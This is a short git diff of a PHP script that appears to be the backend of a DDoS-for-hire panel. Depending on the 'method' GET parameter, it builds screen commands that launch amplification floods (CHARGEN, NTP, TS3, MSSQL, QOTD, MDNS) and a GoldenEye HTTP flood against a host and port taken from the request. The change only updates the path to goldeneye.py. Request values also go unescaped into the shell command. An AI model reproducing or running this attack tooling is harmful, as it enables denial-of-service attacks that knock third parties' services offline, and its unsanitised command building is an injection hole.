@@ -48,7 +48,7 @@ if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {
         elseif($_GET['method'] == "CHARGEN") { $command = "screen -dmS {$smIP} ./chargen {$ip} {$port} chargen_amp.txt 8 -1 {$time}"; }
         elseif($_GET['method'] == "TS3") { $command = "screen -dmS {$smIP} ./ts3 {$ip} {$port} ts3_amp.txt 3 {$time}"; }
         elseif($_GET['method'] == "NTP") { $command = "screen -dmS {$smIP} ./ntp {$ip} {$port} ntp_amp.txt 3 {$time}"; }
-        elseif($_GET['method'] == "CC") { $command = "screen -dmS {$smIP} python3 goldeneye.py {$ip} -w 500 -s 300"; }
+        elseif($_GET['method'] == "CC") { $command = "screen -dmS {$smIP} python3 DDOS-script/goldeneye.py {$ip} -w 500 -s 300"; }
 	    elseif($_GET['method'] == "MSSQL") { $command = "screen -dmS {$smIP} ./MSSQL {$ip} {$port} mssql_amp.txt 8 {$time}"; }
 	    elseif($_GET['method'] == "QOTD") { $command = "screen -dmS {$smIP} ./qotd {$ip} {$port} qotd_amp.txt -1 8 {$time}"; }
 	    elseif($_GET['method'] == "MDNS") { $command = "screen -dmS {$smIP} ./mdns {$ip} {$port} mdns_amp.txt 3 {$time}"; }
